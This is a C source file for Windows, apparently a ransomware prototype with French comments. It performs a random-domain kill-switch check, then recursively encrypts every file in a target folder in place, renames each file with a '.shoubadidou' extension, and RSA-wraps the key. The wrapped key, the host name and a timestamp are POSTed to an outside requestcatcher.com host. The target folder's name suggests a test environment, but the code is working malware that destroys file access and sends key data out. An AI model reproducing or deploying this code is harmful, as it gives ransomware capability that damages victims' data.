#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <wincrypt.h>
#include <tchar.h>
#include <strsafe.h>
#include <winhttp.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")

#define AES_KEY_SIZE 32
const int RAND_URL_LEN = 40;

// Génère une chaîne aléatoire de lettres a-z
void generate_random_string(char *str, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyz0123456789";
    for (size_t i = 0; i < length; i++) {
        int key = rand() % (sizeof(charset) - 1);
        str[i] = charset[key];
    }
    str[length] = '\0';
}

// Retourne true si la requête GET réussit (on a un handle valide)
int killswitch_triggered(const char *url) {
    WCHAR wide_url[256];
    MultiByteToWideChar(CP_ACP, 0, url, -1, wide_url, 256);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return 0;

    URL_COMPONENTSW urlComp = {0};
    WCHAR hostName[256];
    WCHAR urlPath[256];

    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = hostName;
    urlComp.dwHostNameLength = sizeof(hostName)/sizeof(WCHAR);
    urlComp.lpszUrlPath = urlPath;
    urlComp.dwUrlPathLength = sizeof(urlPath)/sizeof(WCHAR);

    if (!WinHttpCrackUrl(wide_url, 0, 0, &urlComp)) {
        WinHttpCloseHandle(hSession);
        return 0;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName,
                                        urlComp.nPort, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return 0;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath,
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0);

    BOOL result = WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) &&
                  WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}


int generate_aes_key(BYTE *key, DWORD key_len) {
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return 0;
    }
    if (!CryptGenRandom(hProv, key_len, key)) {
        CryptReleaseContext(hProv, 0);
        return 0;
    }
    CryptReleaseContext(hProv, 0);
    return 1;
}

int encrypt_file(const char *filepath, const BYTE *key, DWORD key_len) {
    FILE *file = fopen(filepath, "rb+");
    if (!file) return 0;

    fseek(file, 0, SEEK_END);
    long filesize = ftell(file);
    rewind(file);

    BYTE *buffer = (BYTE *)malloc(filesize);
    if (!buffer) {
        fclose(file);
        return 0;
    }

    fread(buffer, 1, filesize, file);

    // XOR simple pour la démo (remplace par AES plus tard)
    for (long i = 0; i < filesize; i++) {
        buffer[i] ^= key[i % key_len];
    }

    rewind(file);
    fwrite(buffer, 1, filesize, file);
    fclose(file);
    free(buffer);
    char new_filepath[MAX_PATH];
    snprintf(new_filepath, sizeof(new_filepath), "%s.shoubadidou", filepath);
    // Renommer le fichier
    if (!MoveFileA(filepath, new_filepath)) {
        fprintf(stderr, "[!] Failed to rename file: %s\n", filepath);
        return 0;
    }
    return 1;
}

void encrypt_directory(const char *dirpath, const BYTE *key, DWORD key_len) {
    char search_path[MAX_PATH];
    snprintf(search_path, sizeof(search_path), "%s\\*", dirpath);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search_path, &fd);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;

        char fullpath[MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", dirpath, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(fullpath, key, key_len);
        } else {
            printf("[*] Encrypting: %s\n", fullpath);
            encrypt_file(fullpath, key, key_len);
        }

    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>

int encrypt_aes_key_rsa_from_der(const BYTE *aes_key, DWORD aes_key_len, BYTE **encrypted_key, DWORD *encrypted_len, const char *pubkey_der_path) {
    // 1. Lire le fichier DER
    FILE *f = fopen(pubkey_der_path, "rb");
    if (!f) {
        fprintf(stderr, "[!] Failed to open DER file: %s\n", pubkey_der_path);
        return 0;
    }
    fseek(f, 0, SEEK_END);
    long filesize = ftell(f);
    rewind(f);

    BYTE *der_buffer = (BYTE *)malloc(filesize);
    if (!der_buffer) {
        fclose(f);
        fprintf(stderr, "[!] Failed to allocate memory for DER buffer\n");
        return 0;
    }

    fread(der_buffer, 1, filesize, f);
    fclose(f);

    // 2. Décoder DER en CERT_PUBLIC_KEY_INFO
    DWORD cbDecoded = 0;
    if (!CryptDecodeObject(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                           X509_PUBLIC_KEY_INFO,
                           der_buffer,
                           filesize,
                           0,
                           NULL,
                           &cbDecoded)) {
        fprintf(stderr, "[!] CryptDecodeObject failed to get size. Error: %lu\n", GetLastError());
        free(der_buffer);
        return 0;
    }

    CERT_PUBLIC_KEY_INFO *pPubKeyInfo = (CERT_PUBLIC_KEY_INFO *)malloc(cbDecoded);
    if (!pPubKeyInfo) {
        fprintf(stderr, "[!] Failed to allocate memory for CERT_PUBLIC_KEY_INFO\n");
        free(der_buffer);
        return 0;
    }

    if (!CryptDecodeObject(X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                           X509_PUBLIC_KEY_INFO,
                           der_buffer,
                           filesize,
                           0,
                           pPubKeyInfo,
                           &cbDecoded)) {
        fprintf(stderr, "[!] CryptDecodeObject failed. Error: %lu\n", GetLastError());
        free(der_buffer);
        free(pPubKeyInfo);
        return 0;
    }

    free(der_buffer);

    // 3. Importer la clé publique
    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        fprintf(stderr, "[!] CryptAcquireContext failed. Error: %lu\n", GetLastError());
        free(pPubKeyInfo);
        return 0;
    }

    HCRYPTKEY hPubKey = 0;
    if (!CryptImportPublicKeyInfo(hProv, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, pPubKeyInfo, &hPubKey)) {
        fprintf(stderr, "[!] CryptImportPublicKeyInfo failed. Error: %lu\n", GetLastError());
        CryptReleaseContext(hProv, 0);
        free(pPubKeyInfo);
        return 0;
    }

    free(pPubKeyInfo);

    // 4. Préparer le buffer d'encryption
    DWORD buf_size = 0;
    if (!CryptEncrypt(hPubKey, 0, TRUE, 0, NULL, &buf_size, 0)) {
        fprintf(stderr, "[!] CryptEncrypt (get size) failed. Error: %lu\n", GetLastError());
        CryptDestroyKey(hPubKey);
        CryptReleaseContext(hProv, 0);
        return 0;
    }

    *encrypted_key = (BYTE *)malloc(buf_size);
    if (!*encrypted_key) {
        fprintf(stderr, "[!] Memory allocation failed\n");
        CryptDestroyKey(hPubKey);
        CryptReleaseContext(hProv, 0);
        return 0;
    }

    memcpy(*encrypted_key, aes_key, aes_key_len);
    *encrypted_len = aes_key_len;

    if (!CryptEncrypt(hPubKey, 0, TRUE, 0, *encrypted_key, encrypted_len, buf_size)) {
        fprintf(stderr, "[!] CryptEncrypt failed. Error: %lu\n", GetLastError());
        free(*encrypted_key);
        *encrypted_key = NULL;
        CryptDestroyKey(hPubKey);
        CryptReleaseContext(hProv, 0);
        return 0;
    }

    CryptDestroyKey(hPubKey);
    CryptReleaseContext(hProv, 0);

    return 1;
}


void send_rsa_key_info(const BYTE *encrypted_key, DWORD encrypted_len) {
    CHAR computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    if (!GetComputerNameA(computer_name, &size)) {
        printf("[!] Failed to get computer name. Error: %lu\n", GetLastError());
        return;
    }

    time_t now = time(NULL);

    char post_data[2048];
    int offset = snprintf(post_data, sizeof(post_data),
        "host=%s&timestamp=%lld&key=", computer_name, (long long)now);

    for (DWORD i = 0; i < encrypted_len && offset < (int)(sizeof(post_data) - 2); ++i)
        offset += sprintf(post_data + offset, "%02X", encrypted_key[i]);

    printf("[*] POST data prepared: %s\n", post_data);

    HINTERNET hSession = WinHttpOpen(L"shoubadidou", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("[!] WinHttpOpen failed. Error: %lu\n", GetLastError());
        return;
    }
    printf("[+] WinHttpOpen succeeded.\n");

    HINTERNET hConnect = WinHttpConnect(hSession, L"shoubadidou.requestcatcher.com",
                                        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        printf("[!] WinHttpConnect failed. Error: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return;
    }
    printf("[+] WinHttpConnect succeeded.\n");

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/",
                                            NULL, WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES,
                                            WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        printf("[!] WinHttpOpenRequest failed. Error: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }
    printf("[+] WinHttpOpenRequest succeeded.\n");

    BOOL sent = WinHttpSendRequest(hRequest, 
                                  L"Content-Type: application/x-www-form-urlencoded\r\n", -1L,
                                  post_data, strlen(post_data),
                                  strlen(post_data), 0);
    if (!sent) {
        printf("[!] WinHttpSendRequest failed. Error: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return;
    }
    printf("[+] WinHttpSendRequest succeeded.\n");

    BOOL received = WinHttpReceiveResponse(hRequest, NULL);
    if (!received) {
        printf("[!] WinHttpReceiveResponse failed. Error: %lu\n", GetLastError());
    } else {
        printf("[+] WinHttpReceiveResponse succeeded.\n");
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}




int main() {
    srand((unsigned int)time(NULL));
    char rand_domain[RAND_URL_LEN + 1];
    generate_random_string(rand_domain, RAND_URL_LEN);
    char url[256];
    snprintf(url, sizeof(url), "http://%s.com", rand_domain);
    printf("[*] Testing URL: %s\n", url);
    if (killswitch_triggered(url)) {
        printf("[!] Killswitch triggered! Exiting...\n");
        return 0;
    }
    printf("[+] No killswitch found. Continuing execution...\n");
    // Génération de la clé AES
    BYTE aes_key[AES_KEY_SIZE];
    if (!generate_aes_key(aes_key, AES_KEY_SIZE)) {
        fprintf(stderr, "[!] Failed to generate AES key\n");
        return 1;
    }

    printf("[+] AES key generated. Encrypting files...\n");

    // Chiffrement du dossier
    const char *target_dir = "C:\\Users\\fsali\\Documents\\fake_env_Documents";
    encrypt_directory(target_dir, aes_key, AES_KEY_SIZE);
    printf("[+] Encryption completed.\n");
    BYTE *encrypted_key = NULL;
    DWORD encrypted_len = 0;

    const char *pubkey_path = "Kelpie\\templates\\certs\\public_key.der";

    if (encrypt_aes_key_rsa_from_der(aes_key, AES_KEY_SIZE, &encrypted_key, &encrypted_len, pubkey_path)) {
        send_rsa_key_info(encrypted_key, encrypted_len);
        free(encrypted_key);
    } else {
        printf("[!] Failed to encrypt and send AES key\n");
    }
    return 0;
}
